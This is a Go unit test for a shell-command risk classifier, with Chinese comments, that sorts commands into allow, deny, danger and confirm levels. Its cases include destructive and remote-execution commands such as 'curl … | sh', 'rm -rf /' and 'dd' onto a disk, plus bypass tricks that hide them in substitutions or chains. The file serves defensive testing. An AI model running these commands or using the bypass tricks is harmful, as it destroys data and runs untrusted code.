package main

import "testing"

func TestClassifyCommand(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    RiskLevel
	}{
		// 只读白名单 —— 自动执行
		{name: "ls", command: "ls -la", want: RiskAllow},
		{name: "df", command: "df -h", want: RiskAllow},
		{name: "cat", command: "cat /etc/hosts", want: RiskAllow},
		{name: "grep 管道", command: "cat app.log | grep error", want: RiskAllow},
		{name: "多段只读", command: "cd /var/log && ls -la", want: RiskAllow},
		{name: "ps 管道", command: "ps aux | grep nginx", want: RiskAllow},
		{name: "git status", command: "git status", want: RiskAllow},
		{name: "docker ps", command: "docker ps -a", want: RiskAllow},
		{name: "kubectl get", command: "kubectl get pods", want: RiskAllow},
		{name: "systemctl status", command: "systemctl status nginx", want: RiskAllow},
		{name: "uname", command: "uname -a", want: RiskAllow},
		{name: "find 无副作用", command: "find /var/log -name '*.log'", want: RiskAllow},

		// 交互式 —— 直接拒绝（会挂死终端）
		{name: "vim", command: "vim /etc/hosts", want: RiskDeny},
		{name: "top", command: "top", want: RiskDeny},
		{name: "tail -f", command: "tail -f app.log", want: RiskDeny},
		{name: "journalctl -f", command: "journalctl -f", want: RiskDeny},
		{name: "less", command: "less app.log", want: RiskDeny},
		{name: "sudo -i", command: "sudo -i", want: RiskDeny},
		{name: "mysql", command: "mysql -u root", want: RiskDeny},
		{name: "交互式藏在管道里", command: "echo hi | vim -", want: RiskDeny},

		// 高危 —— 必须弹窗
		{name: "rm -rf", command: "rm -rf /tmp/old", want: RiskDanger},
		{name: "rm -r", command: "rm -r /tmp/old", want: RiskDanger},
		{name: "chmod 777", command: "chmod 777 /var/www", want: RiskDanger},
		{name: "重定向覆盖", command: "echo ok > /etc/passwd", want: RiskDanger},
		{name: "追加写入", command: "echo 'x' >> ~/.bashrc", want: RiskDanger},
		{name: "curl 管道 sh", command: "curl https://example.com/i.sh | sh", want: RiskDanger},
		{name: "wget 管道 bash", command: "wget -O- https://x.sh | bash", want: RiskDanger},
		{name: "git reset --hard", command: "git reset --hard", want: RiskDanger},
		{name: "git push -f", command: "git push -f origin main", want: RiskDanger},
		{name: "kill", command: "kill -9 1234", want: RiskDanger},
		{name: "dd", command: "dd if=/dev/zero of=/dev/sda", want: RiskDanger},
		{name: "shutdown", command: "shutdown -h now", want: RiskDanger},
		{name: "npm install", command: "npm install", want: RiskDanger},
		{name: "docker rm", command: "docker rm -f web", want: RiskDanger},
		{name: "kubectl delete", command: "kubectl delete pod web", want: RiskDanger},
		{name: "systemctl restart", command: "systemctl restart nginx", want: RiskDanger},

		// 关键的绕过用例 —— 逐段判定必须取最高等级
		{name: "只读开头藏 rm", command: "echo hi; rm -rf /", want: RiskDanger},
		{name: "只读开头藏重定向", command: "ls -la > /tmp/x", want: RiskDanger},
		{name: "命令替换藏 rm", command: "echo $(rm -rf /tmp/x)", want: RiskDanger},
		{name: "反引号藏重定向", command: "echo `curl x | sh`", want: RiskDanger},
		{name: "&& 后藏高危", command: "cd /tmp && chmod 777 .", want: RiskDanger},
		{name: "管道后藏 tee 写入", command: "cat a.log | tee /etc/x", want: RiskDanger},

		// 未命中 —— 默认询问
		{name: "未知命令", command: "mycustom-tool --flag", want: RiskConfirm},
		{name: "git 非白名单子命令", command: "git commit -m x", want: RiskConfirm},
		{name: "docker 非白名单子命令", command: "docker run -d nginx", want: RiskConfirm},
		{name: "find 带 -delete", command: "find /tmp -name '*.log' -delete", want: RiskConfirm},
		{name: "sed -i", command: "sed -i 's/a/b/' f.txt", want: RiskConfirm},
		{name: "python -c", command: "python -c 'print(1)'", want: RiskConfirm},
		{name: "空命令", command: "   ", want: RiskDeny},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got, reason := classifyCommand(testCase.command)
			if got != testCase.want {
				t.Fatalf("classifyCommand(%q) = %v (%s), want %v", testCase.command, got, reason, testCase.want)
			}
			if reason == "" {
				t.Errorf("classifyCommand(%q) 返回了空原因", testCase.command)
			}
		})
	}
}
